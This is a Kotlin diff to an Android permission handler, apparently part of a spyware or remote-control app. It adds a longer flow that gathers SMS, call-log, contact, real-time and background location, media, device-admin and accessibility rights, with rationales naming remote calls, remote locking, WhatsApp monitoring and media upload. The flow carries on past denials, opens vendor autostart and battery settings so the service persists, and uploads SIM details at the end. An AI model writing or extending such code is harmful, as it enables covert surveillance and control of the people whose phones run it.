@@ -21,7 +21,7 @@ class PermissionHandler(
     
     private val activityRef = WeakReference(activity)
     private var currentStep = 0
-    private val totalSteps = 6
+    private val totalSteps = 8
     private var permissionsRequested = false
     
     companion object {
@@ -30,6 +30,7 @@ class PermissionHandler(
         private const val RC_LOCATION_PERMISSIONS = 102
         private const val RC_STORAGE_PERMISSIONS = 103
         private const val RC_BACKGROUND_LOCATION = 104
+        private const val RC_NOTIFICATION_PERMISSIONS = 105
     }
     
     // Core SMS permissions
@@ -56,12 +57,16 @@ class PermissionHandler(
     
     // Storage permissions (version dependent)
     private val storagePermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-        arrayOf(
-            Manifest.permission.READ_MEDIA_IMAGES,
-            Manifest.permission.POST_NOTIFICATIONS
-        )
+        arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
     } else {
         arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+    }
+    
+    // Notification permissions (Android 13+)
+    private val notificationPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        arrayOf(Manifest.permission.POST_NOTIFICATIONS)
+    } else {
+        arrayOf()
     }
 
     fun requestPermissions() {
@@ -72,11 +77,11 @@ class PermissionHandler(
             return
         }
         
-        Logger.log("Starting EasyPermissions permission flow")
+        Logger.log("Starting comprehensive permission flow for all features")
         currentStep = 1
         permissionsRequested = true
         
-        // Step 1: Request SMS permissions first
+        // Step 1: Request SMS permissions first (most critical)
         requestSmsPermissions(activity)
     }
 
@@ -93,7 +98,7 @@ class PermissionHandler(
             
             EasyPermissions.requestPermissions(
                 PermissionRequest.Builder(activity, RC_SMS_PERMISSIONS, *smsPermissions)
-                    .setRationale("SMS permissions are required to receive, read, and send SMS messages for the app to function properly.")
+                    .setRationale("SMS permissions are CRITICAL for the app to receive, read, and send SMS messages. This is the core functionality.")
                     .setPositiveButtonText("Grant")
                     .setNegativeButtonText("Deny")
                     .build()
@@ -118,7 +123,7 @@ class PermissionHandler(
             
             EasyPermissions.requestPermissions(
                 PermissionRequest.Builder(activity, RC_PHONE_PERMISSIONS, *phonePermissions)
-                    .setRationale("Phone permissions are required to access phone state, make calls, read contacts, and call logs.")
+                    .setRationale("Phone permissions are required to:\n• Access phone state and SIM details\n• Make calls remotely\n• Read contacts and call logs\n• Monitor phone activity")
                     .setPositiveButtonText("Grant")
                     .setNegativeButtonText("Deny")
                     .build()
@@ -143,7 +148,7 @@ class PermissionHandler(
             
             EasyPermissions.requestPermissions(
                 PermissionRequest.Builder(activity, RC_LOCATION_PERMISSIONS, *locationPermissions)
-                    .setRationale("Location permissions are required to track device location for monitoring purposes.")
+                    .setRationale("Location permissions are required to:\n• Track device location in real-time\n• Provide location history\n• Enable location-based monitoring")
                     .setPositiveButtonText("Grant")
                     .setNegativeButtonText("Deny")
                     .build()
@@ -159,17 +164,17 @@ class PermissionHandler(
         Logger.log("Step $currentStep/$totalSteps: Requesting storage permissions")
         
         try {
-            if (EasyPermissions.hasPermissions(activity, *storagePermissions)) {
-                Logger.log("Storage permissions already granted")
+            if (storagePermissions.isEmpty() || EasyPermissions.hasPermissions(activity, *storagePermissions)) {
+                Logger.log("Storage permissions already granted or not needed")
                 currentStep++
-                requestBackgroundLocation(activity)
+                requestNotificationPermissions(activity)
                 return
             }
             
             val rationale = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                "Media and notification permissions are required to access images and show notifications."
+                "Media access permission is required to:\n• Upload device images\n• Access photo gallery\n• Monitor media files"
             } else {
-                "Storage permission is required to access files and images on the device."
+                "Storage permission is required to:\n• Access files and images\n• Upload device content\n• Read media files"
             }
             
             EasyPermissions.requestPermissions(
@@ -181,6 +186,31 @@ class PermissionHandler(
             )
         } catch (e: Exception) {
             Logger.error("Error requesting storage permissions", e)
+            currentStep++
+            requestNotificationPermissions(activity)
+        }
+    }
+
+    private fun requestNotificationPermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting notification permissions")
+        
+        try {
+            if (notificationPermissions.isEmpty() || EasyPermissions.hasPermissions(activity, *notificationPermissions)) {
+                Logger.log("Notification permissions already granted or not needed")
+                currentStep++
+                requestBackgroundLocation(activity)
+                return
+            }
+            
+            EasyPermissions.requestPermissions(
+                PermissionRequest.Builder(activity, RC_NOTIFICATION_PERMISSIONS, *notificationPermissions)
+                    .setRationale("Notification permission is required to:\n• Show important alerts\n• Display service status\n• Provide system notifications")
+                    .setPositiveButtonText("Grant")
+                    .setNegativeButtonText("Deny")
+                    .build()
+            )
+        } catch (e: Exception) {
+            Logger.error("Error requesting notification permissions", e)
             currentStep++
             requestBackgroundLocation(activity)
         }
@@ -206,7 +236,7 @@ class PermissionHandler(
             
             EasyPermissions.requestPermissions(
                 PermissionRequest.Builder(activity, RC_BACKGROUND_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                    .setRationale("Background location access is needed to track location when the app is not actively being used.")
+                    .setRationale("Background location access is CRITICAL for:\n• Continuous location tracking\n• Location monitoring when app is closed\n• Real-time location updates")
                     .setPositiveButtonText("Grant")
                     .setNegativeButtonText("Deny")
                     .build()
@@ -219,50 +249,72 @@ class PermissionHandler(
     }
 
     private fun requestSpecialPermissions(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Checking special permissions")
+        Logger.log("Step $currentStep/$totalSteps: Requesting special permissions")
         
         try {
-            // These are NOT runtime permissions and should be handled via Settings intents
-            val specialPermissions = mutableListOf<String>()
-            
-            // Battery optimization
+            // Battery optimization (CRITICAL for service persistence)
             if (!isBatteryOptimizationDisabled(activity)) {
-                specialPermissions.add("Battery Optimization")
+                requestBatteryOptimization(activity)
+                return
             }
             
-            // System alert window
+            currentStep++
+            requestSystemPermissions(activity)
+        } catch (e: Exception) {
+            Logger.error("Error requesting special permissions", e)
+            currentStep++
+            requestSystemPermissions(activity)
+        }
+    }
+
+    private fun requestSystemPermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting system permissions")
+        
+        try {
+            // System alert window (for overlay functionality)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
-                specialPermissions.add("Display over other apps")
+                requestOverlayPermission(activity)
+                return
             }
             
-            // Device admin
+            currentStep++
+            requestDeviceAdminPermissions(activity)
+        } catch (e: Exception) {
+            Logger.error("Error requesting system permissions", e)
+            currentStep++
+            requestDeviceAdminPermissions(activity)
+        }
+    }
+
+    private fun requestDeviceAdminPermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting device admin and accessibility")
+        
+        try {
+            // Device admin (for lock/unlock functionality)
             if (!isDeviceAdminEnabled(activity)) {
-                specialPermissions.add("Device Administrator")
+                requestDeviceAdmin(activity)
+                return
             }
             
-            // Accessibility service
+            // Accessibility service (for WhatsApp monitoring)
             if (!isAccessibilityServiceEnabled(activity)) {
-                specialPermissions.add("Accessibility Service")
+                requestAccessibilityService(activity)
+                return
             }
             
             // Exact alarms (Android 12+)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                 if (!alarmManager.canScheduleExactAlarms()) {
-                    specialPermissions.add("Schedule Exact Alarms")
+                    requestExactAlarms(activity)
+                    return
                 }
             }
             
-            if (specialPermissions.isNotEmpty()) {
-                Logger.log("Special permissions needed: $specialPermissions")
-                requestBatteryOptimization(activity)
-            } else {
-                Logger.log("All special permissions already granted")
-                currentStep++
-                requestManufacturerSpecificSettings(activity)
-            }
+            currentStep++
+            requestManufacturerSpecificSettings(activity)
         } catch (e: Exception) {
-            Logger.error("Error checking special permissions", e)
+            Logger.error("Error requesting device admin permissions", e)
             currentStep++
             requestManufacturerSpecificSettings(activity)
         }
@@ -290,6 +342,10 @@ class PermissionHandler(
                 }
                 RC_STORAGE_PERMISSIONS -> {
                     currentStep++
+                    requestNotificationPermissions(activity)
+                }
+                RC_NOTIFICATION_PERMISSIONS -> {
+                    currentStep++
                     requestBackgroundLocation(activity)
                 }
                 RC_BACKGROUND_LOCATION -> {
@@ -311,7 +367,7 @@ class PermissionHandler(
             // Check if some permissions are permanently denied
             if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                 Logger.warn("Some permissions permanently denied: $perms")
-                // Could show settings dialog here, but continue with flow
+                // Continue anyway, but log the issue
             }
             
             // Continue with next step regardless of denials
@@ -330,6 +386,10 @@ class PermissionHandler(
                 }
                 RC_STORAGE_PERMISSIONS -> {
                     currentStep++
+                    requestNotificationPermissions(activity)
+                }
+                RC_NOTIFICATION_PERMISSIONS -> {
+                    currentStep++
                     requestBackgroundLocation(activity)
                 }
                 RC_BACKGROUND_LOCATION -> {
@@ -343,12 +403,12 @@ class PermissionHandler(
     }
 
     private fun requestBatteryOptimization(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting battery optimization disable")
+        Logger.log("Requesting battery optimization disable (CRITICAL)")
         
         try {
             if (isBatteryOptimizationDisabled(activity)) {
                 currentStep++
-                requestOverlayPermission(activity)
+                requestSystemPermissions(activity)
                 return
             }
             
@@ -361,23 +421,23 @@ class PermissionHandler(
             // Continue after delay
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                 currentStep++
-                requestOverlayPermission(activity)
+                requestSystemPermissions(activity)
             }, 3000)
             
         } catch (e: Exception) {
             Logger.error("Failed to request battery optimization", e)
             currentStep++
-            requestOverlayPermission(activity)
+            requestSystemPermissions(activity)
         }
     }
 
     private fun requestOverlayPermission(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting overlay permission")
+        Logger.log("Requesting overlay permission")
         
         try {
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(activity)) {
                 currentStep++
-                requestDeviceAdmin(activity)
+                requestDeviceAdminPermissions(activity)
                 return
             }
             
@@ -390,23 +450,38 @@ class PermissionHandler(
             // Continue after delay
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                 currentStep++
-                requestDeviceAdmin(activity)
+                requestDeviceAdminPermissions(activity)
             }, 3000)
             
         } catch (e: Exception) {
             Logger.error("Failed to request overlay permission", e)
             currentStep++
-            requestDeviceAdmin(activity)
+            requestDeviceAdminPermissions(activity)
         }
     }
 
     private fun requestDeviceAdmin(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting device admin")
+        Logger.log("Requesting device admin (for lock/unlock)")
         
         try {
             if (isDeviceAdminEnabled(activity)) {
+                // Check accessibility next
+                if (!isAccessibilityServiceEnabled(activity)) {
+                    requestAccessibilityService(activity)
+                    return
+                }
+                
+                // Check exact alarms
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                    if (!alarmManager.canScheduleExactAlarms()) {
+                        requestExactAlarms(activity)
+                        return
+                    }
+                }
+                
                 currentStep++
-                requestAccessibilityService(activity)
+                requestManufacturerSpecificSettings(activity)
                 return
             }
             
@@ -414,31 +489,61 @@ class PermissionHandler(
             val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                 putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                    "This permission allows the app to lock the device and manage security settings.")
+                    "Device Administrator permission is required for:\n• Remote device locking/unlocking\n• Security management\n• Device control features")
             }
             activity.startActivity(intent)
             Logger.log("Device admin intent launched")
             
             // Continue after delay
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                currentStep++
-                requestAccessibilityService(activity)
+                // Check accessibility next
+                if (!isAccessibilityServiceEnabled(activity)) {
+                    requestAccessibilityService(activity)
+                } else {
+                    // Check exact alarms
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                        val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                        if (!alarmManager.canScheduleExactAlarms()) {
+                            requestExactAlarms(activity)
+                        } else {
+                            currentStep++
+                            requestManufacturerSpecificSettings(activity)
+                        }
+                    } else {
+                        currentStep++
+                        requestManufacturerSpecificSettings(activity)
+                    }
+                }
             }, 3000)
             
         } catch (e: Exception) {
             Logger.error("Failed to request device admin", e)
-            currentStep++
-            requestAccessibilityService(activity)
+            // Continue with accessibility
+            if (!isAccessibilityServiceEnabled(activity)) {
+                requestAccessibilityService(activity)
+            } else {
+                currentStep++
+                requestManufacturerSpecificSettings(activity)
+            }
         }
     }
 
     private fun requestAccessibilityService(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting accessibility service")
+        Logger.log("Requesting accessibility service (for WhatsApp monitoring)")
         
         try {
             if (isAccessibilityServiceEnabled(activity)) {
+                // Check exact alarms
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                    if (!alarmManager.canScheduleExactAlarms()) {
+                        requestExactAlarms(activity)
+                        return
+                    }
+                }
+                
                 currentStep++
-                requestExactAlarms(activity)
+                requestManufacturerSpecificSettings(activity)
                 return
             }
             
@@ -448,19 +553,41 @@ class PermissionHandler(
             
             // Continue after delay
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                currentStep++
-                requestExactAlarms(activity)
+                // Check exact alarms
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                    if (!alarmManager.canScheduleExactAlarms()) {
+                        requestExactAlarms(activity)
+                    } else {
+                        currentStep++
+                        requestManufacturerSpecificSettings(activity)
+                    }
+                } else {
+                    currentStep++
+                    requestManufacturerSpecificSettings(activity)
+                }
             }, 3000)
             
         } catch (e: Exception) {
             Logger.error("Failed to open accessibility settings", e)
-            currentStep++
-            requestExactAlarms(activity)
+            // Check exact alarms
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                if (!alarmManager.canScheduleExactAlarms()) {
+                    requestExactAlarms(activity)
+                } else {
+                    currentStep++
+                    requestManufacturerSpecificSettings(activity)
+                }
+            } else {
+                currentStep++
+                requestManufacturerSpecificSettings(activity)
+            }
         }
     }
 
     private fun requestExactAlarms(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting exact alarms permission")
+        Logger.log("Requesting exact alarms permission (Android 12+)")
         
         try {
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
@@ -522,20 +649,30 @@ class PermissionHandler(
     }
 
     private fun openXiaomiSettings(activity: Activity) {
+        Logger.log("Opening MIUI-specific settings")
+        
         val intents = listOf(
+            // Autostart management
             Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
-            Intent().setComponent(ComponentName("com.xiaomi.mipicks", "com.xiaomi.mipicks.ui.AppPicksTabActivity")),
-            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName)
+            // Battery optimization
+            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
+            // App permissions
+            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName),
+            // Security center
+            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.securitycenter.Main")),
+            // Power settings
+            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"))
         )
         
-        tryLaunchIntents(activity, intents, "MIUI Security settings")
+        tryLaunchIntents(activity, intents, "MIUI Security and Power settings")
     }
 
     private fun openOppoSettings(activity: Activity) {
         val intents = listOf(
             Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
             Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
-            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity"))
+            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
+            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.MainActivity"))
         )
         
         tryLaunchIntents(activity, intents, "ColorOS Phone Manager")
@@ -545,7 +682,8 @@ class PermissionHandler(
         val intents = listOf(
             Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
             Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
-            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity"))
+            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity")),
+            Intent().setComponent(ComponentName("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity"))
         )
         
         tryLaunchIntents(activity, intents, "Vivo iManager")
@@ -555,7 +693,8 @@ class PermissionHandler(
         val intents = listOf(
             Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
             Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
-            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"))
+            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")),
+            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.MainActivity"))
         )
         
         tryLaunchIntents(activity, intents, "Huawei Phone Manager")
@@ -565,6 +704,7 @@ class PermissionHandler(
         val intents = listOf(
             Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
             Intent().setComponent(ComponentName("com.samsung.android.sm_cn", "com.samsung.android.sm.ui.ram.AutoRunActivity")),
+            Intent().setComponent(ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.ram.AutoRunActivity")),
             Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
         )
         
@@ -624,7 +764,7 @@ class PermissionHandler(
     }
 
     private fun finishPermissionFlow(activity: Activity) {
-        Logger.log("Permission flow completed")
+        Logger.log("Permission flow completed - all permissions requested")
         
         try {
             // Upload SIM details after permissions are granted
@@ -686,7 +826,7 @@ class PermissionHandler(
         
         try {
             // Check runtime permissions using EasyPermissions
-            val allPermissions = smsPermissions + phonePermissions + locationPermissions + storagePermissions
+            val allPermissions = smsPermissions + phonePermissions + locationPermissions + storagePermissions + notificationPermissions
             val runtimeGranted = EasyPermissions.hasPermissions(activity, *allPermissions)
             
             // Check background location separately
@@ -715,7 +855,11 @@ class PermissionHandler(
             
             Logger.log("Permission status - Runtime: $runtimeGranted, Background: $backgroundLocationGranted, Battery: $batteryOptimized, Overlay: $overlayGranted, DeviceAdmin: $deviceAdminGranted, Accessibility: $accessibilityGranted, ExactAlarms: $exactAlarmsGranted")
             
-            return runtimeGranted && backgroundLocationGranted && batteryOptimized && overlayGranted && deviceAdminGranted && accessibilityGranted && exactAlarmsGranted
+            // Return true if at least core permissions are granted (SMS, Phone, Location)
+            val corePermissions = smsPermissions + phonePermissions + locationPermissions
+            val coreGranted = EasyPermissions.hasPermissions(activity, *corePermissions)
+            
+            return coreGranted && batteryOptimized
         } catch (e: Exception) {
             Logger.error("Error checking permissions", e)
             return false
@@ -728,7 +872,7 @@ class PermissionHandler(
             val activity = activityRef.get() ?: return
             
             if (areAllPermissionsGranted()) {
-                Logger.log("All permissions granted on resume")
+                Logger.log("Core permissions granted on resume")
                 finishPermissionFlow(activity)
             }
         } catch (e: Exception) {
